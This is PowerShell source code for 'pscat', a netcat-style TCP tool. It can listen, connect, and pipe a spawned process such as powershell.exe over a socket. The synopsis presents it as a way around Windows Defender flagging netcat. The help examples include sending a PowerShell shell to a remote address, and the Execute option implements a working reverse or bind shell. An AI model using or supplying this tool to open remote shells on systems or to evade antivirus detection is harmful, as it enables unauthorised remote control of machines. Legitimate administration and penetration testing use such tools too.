function pscat {
<#
.SYNOPSIS
        PSCAT is a robust network concatenation tool designed to operate solely
        in powershell. NETCAT often gets flagged by WINDOWS DEFENDER as malicious
        and WINDOWS does no offer built-in network tools. This tool solves both
        problems. This is no novelty. Methods included are well-known and widely
        used.

        Notes:
                - Tested on WINDOWS 11
                - Tested on UBUNTU 24.04
.DESCRIPTION
        Author: SilentisVox (@SilentisVox)
        License: BSD 3-Clause
.EXAMPLE
        # Listen on a specified port with verbosity.
        PS C:\> pc -l -p 4444 -v
        VERBOSE: listening on [0.0.0.0] 4444 ...
        VERBOSE: connect to [0.0.0.0] from [192.168.1.109] 65535
.EXAMPLE
        # Connect to a remote host and send a shell with verbosity.
        PS C:\> pc 192.168.109 4444 -e "powershell.exe -NoLogo" -v
        VERBOSE: connection to [192.168.109] 4444 succeeded
#>
        [CmdletBinding(DefaultParameterSetName = 'Connect')]
        param(
                [Parameter(ParameterSetName = 'Connect')]
                [switch] $Connect,

                [Parameter(ParameterSetName = 'Listen')]
                [switch] $Listen,

                [Parameter(ParameterSetName = 'Connect', Position = 0, Mandatory)]
                [Parameter(ParameterSetName = 'Listen', Position = 0)]
                [ipaddress] $Address = [ipaddress]::Any,

                [Parameter(ParameterSetName = 'Connect', Position = 1, Mandatory)]
                [Parameter(ParameterSetName = 'Listen', Position = 1, Mandatory)]
                [int] $Port,

                [Parameter(ParameterSetName = 'Utility')]
                [switch] $UtilizeGuestClient,

                [Parameter(ParameterSetName = 'Utility', Position = 0, Mandatory)]
                [Net.Sockets.TcpClient] $GuestClient,

                [Parameter(ParameterSetName = 'ProcessExecution')]
                [string] $Execute

        )

        if (-not $Connect -and -not $Listen -and -not $GuestClient) {
                $Connect = $true
        }

        $pscat = [pscat]::new()

        if ($Connect) {
                try {
                        if ($pscat.StartConnect($Address, $Port)) {
                                Write-Verbose "connection to [$Address] $Port succeeded"
                        } else {
                                $pscat.Kill()
                                Write-Host "failed to connect"
                                return
                        }
                } finally {
                        if (-not $pscat.TcpClient) {
                                $pscat.Kill()
                        }
                }
        }

        if ($Listen) {
                try {
                        if ($pscat.StartListen($Address, $Port)) {
                                Write-Verbose "listening on [$($pscat.TcpListener.LocalEndpoint.Address)] $($($pscat.TcpListener.LocalEndpoint.Port)) ..."
                        } else {
                                $pscat.Kill()
                                Write-Host "failed to listen"
                                return
                        }

                        if ($pscat.AcceptTcpClient()) {
                                Write-Verbose "connect to [$($pscat.TcpListener.LocalEndpoint.Address)] from [$($pscat.TcpClient.Client.RemoteEndPoint.Address)] $($pscat.TcpClient.Client.RemoteEndPoint.Port)"
                        } else {
                                $pscat.Kill()
                                Write-Host "failed to connect"
                                return
                        }
                } finally {
                        if (-not $pscat.TcpClient) {
                                $pscat.Kill()
                        }
                }
        }

        if ($UtilizeGuestClient -and -not $pscat.AddTcpClient($GuestClient)) {
                $pscat.Kill()
                Write-Host "failed add client"
                return
        }

        if (-not $pscat.TcpClient) {
                $pscat.Kill()
                return
        }

        if ($Execute) {
                $Process, $Arguments = $Execute.Split(" ", 2)

                if (-not $pscat.StartProcess($Process, $Arguments)) {
                        $pscat.Kill()
                        Write-Host "failed to start process"
                        return
                }
        }

        $pscat.SetupStreams()

        try {
                while ($true) {
                        $pscat.UpdateClient()
                }
        } finally {
                $pscat.Kill()
        }
}

Set-Alias pc pscat

class pscat {
        [Net.Sockets.TcpClient] $TcpClient
        [Net.Sockets.TcpListener] $TcpListener
        [Threading.Tasks.Task] $TcpAcceptThread
        [Diagnostics.Process] $Child
        [hashtable] $Streams
        [string] $Command
        [bool] $Redirected

        pscat() {
                $StreamExample = @{
                        IoStream = $null
                        Buffer = $null
                        ReadOperation = $null
                }
                $this.Streams = @{
                        TcpClient = $StreamExample.Clone()
                        StdIn = $StreamExample.Clone()
                        ChildIn = $StreamExample.Clone()
                        ChildOut = $StreamExample.Clone()
                        ChildErr = $StreamExample.Clone()
                }
                $this.Redirected = [Console]::IsInputRedirected
        }

        # There are 3 ways for us to collect a TCP Client. We can either
        # initiate the connection, listen for the connection, or add an
        # existing connection.

        [bool] StartConnect([ipaddress] $Address, [int] $Port) {
                return $this.AddTcpClient([Net.Sockets.TcpClient]::new($Address, $Port))
        }

        [bool] StartListen([ipaddress] $Address, [int] $Port) {
                $this.TcpListener = [Net.Sockets.TcpListener]::new($Address, $Port)
                $this.TcpListener.Server.Blocking = $false
                $this.TcpListener.Start()
                $this.TcpAcceptThread = $this.TcpListener.AcceptTcpClientAsync()

                return -not $this.TcpAcceptThread.IsCanceled
        }

        [bool] AcceptTcpClient() {
                while (-not $this.TcpAcceptThread.IsCompleted) {
                        continue
                }

                $this.TcpListener.Stop()

                return $this.AddTcpClient($this.TcpAcceptThread.Result)
        }

        [bool] AddTcpClient([Net.Sockets.TcpClient] $TcpClient) {
                $TcpClient.Client.Blocking = $true
                $this.TcpClient = $TcpClient
                $this.Streams.TcpClient.IoStream = $this.TcpClient.GetStream()

                return $this.TcpClient -and $this.Streams.TcpClient.IoStream
        }

        # The ability to control child processes is ideal. My idea to
        # accomplish this is: create a process in which we can read from
        # and write into.

        [bool] StartProcess([string] $ProcessName, [string] $Arguments = "") {
                $ProcInfo = [Diagnostics.ProcessStartInfo]::new()
                $ProcInfo.FileName = $ProcessName
                $ProcInfo.Arguments = $Arguments
                $ProcInfo.UseShellExecute = $false
                $ProcInfo.RedirectStandardInput= $true
                $ProcInfo.RedirectStandardOutput = $true
                $ProcInfo.RedirectStandardError = $true

                if (-not ($this.Child = [Diagnostics.Process]::Start($ProcInfo))) {
                        return $false
                }

                $this.Streams.ChildIn.IoStream = $this.Child.StandardInput.BaseStream
                $this.Streams.ChildOut.IoStream = $this.Child.StandardOutput.BaseStream
                $this.Streams.ChildErr.IoStream = $this.Child.StandardError.BaseStream

                return $true
        }

        # Asynchronous reads is what powers our ability to seemlessly
        # communicate with our TCP Client.

        [void] StartReading([hashtable] $Stream) {
                $Stream.Buffer = [byte[]]::new(1024)
                $Stream.ReadOperation = $Stream.IoStream.BeginRead($Stream.Buffer, 0, $Stream.Buffer.Length, $null, $null)
        }

        [void] SetupStreams() {
                if ($this.TcpClient) {
                        $this.StartReading($this.Streams.TcpClient)
                }

                if ($this.Redirected) {
                        $this.Streams.StdIn.IoStream = [Console]::OpenStandardInput()
                        $this.StartReading($this.Streams.StdIn)
                }

                if ($this.Child) {
                        $this.StartReading($this.Streams.ChildOut)
                        $this.StartReading($this.Streams.ChildErr)
                }
        }

        [byte[]] ReadStream([hashtable] $Stream) {
                if (-not $Stream.ReadOperation.IsCompleted) {
                        return @()
                }

                $Length = $Stream.IoStream.EndRead($Stream.ReadOperation)
                $Data = $Stream.Buffer.Clone()[0..($Length - 1)]
                $this.StartReading($Stream)

                return $Data
        }

        # Major console inputs are blocking. My implementation is to check
        # if an input is available, then capure it and do with what we need.
        # This is bare-bones.

        [void] ConsoleInput() {
                $KeyPressed = [Console]::ReadKey($true)

                if ($KeyPressed.Key -eq "Enter") {
                        $this.Command += [char] 10
                        $EncodedCommand = [Text.Encoding]::UTF8.GetBytes($this.Command)
                        $this.Streams.TcpClient.IoStream.Write($EncodedCommand, 0, $EncodedCommand.Length)
                        $this.Streams.TcpClient.IoStream.Flush()
                        $this.Command = ""
                        [Console]::WriteLine()

                        return
                }

                if ($KeyPressed.Key -eq "Backspace") {
                        if ($this.Command.Length -eq 0) {
                                return
                        }

                        $this.Command = $this.Command.Substring(0, $this.Command.Length - 1)
                        [Console]::Write("$([char] 8) $([char] 8)")

                        return
                }

                $this.Command += $KeyPressed.KeyChar
                [Console]::Write($KeyPressed.KeyChar)
        }

        # In the environment a child process is created, only the process
        # will interact with the TCP Client.

        [void] UpdateChild() {
                if ($this.Child.HasExited) {
                        $this.Kill()
                }

                if ($Data = $this.ReadStream($this.Streams.TcpClient)) {
                        $this.Streams.ChildIn.IoStream.Write($Data, 0, $Data.Length)
                        $this.Streams.ChildIn.IoStream.Flush()
                }

                if ($Data = $this.ReadStream($this.Streams.ChildOut)) {
                        $this.Streams.TcpClient.IoStream.Write($Data, 0, $Data.Length)
                        $this.Streams.TcpClient.IoStream.Flush()
                }

                if ($Data = $this.ReadStream($this.Streams.ChildErr)) {
                        $this.Streams.TcpClient.IoStream.Write($Data, 0, $Data.Length)
                        $this.Streams.TcpClient.IoStream.Flush()
                }
        }

        # In the environment PSCAT is being run in a child process, checking
        # for key press will NOT work. In this case, our inputs come from the
        # current process standard input.

        [void] UpdateRedirector() {
                if ($Data = $this.ReadStream($this.Streams.StdIn)) {
                        $this.Streams.TcpClient.IoStream.Write($Data, 0, $Data.Length)
                        $this.Streams.TcpClient.IoStream.Flush()
                }
        }

        [void] UpdateClient() {
                if ($this.Child) {
                        $this.UpdateChild()
                        return
                }

                if ($Data = $this.ReadStream($this.Streams.TcpClient)) {
                        [Console]::Write([Text.Encoding]::UTF8.GetString($Data, 0, $Data.Length))
                }

                if ($this.Redirected) {
                        $this.UpdateRedirector()
                        return
                }

                if ([Console]::KeyAvailable) {
                        $this.ConsoleInput()
                }
        }

        [void] Kill() {
                if ($this.TcpClient) {
                        $this.Streams.TcpClient.IoStream.Close()
                        $this.TcpClient.Close()
                }

                if ($this.TcpListener.Server.IsBound) {
                        $this.TcpListener.Stop()
                }

                if ($this.Redirected) {
                        $this.Streams.StdIn.IoStream.Close()
                }

                if ($this.Child -and -not $this.Child.HasExited) {
                        $this.Streams.ChildOut.IoStream.Close()
                        $this.Streams.ChildErr.IoStream.Close()
                        $this.Child.Kill()
                }
        }
}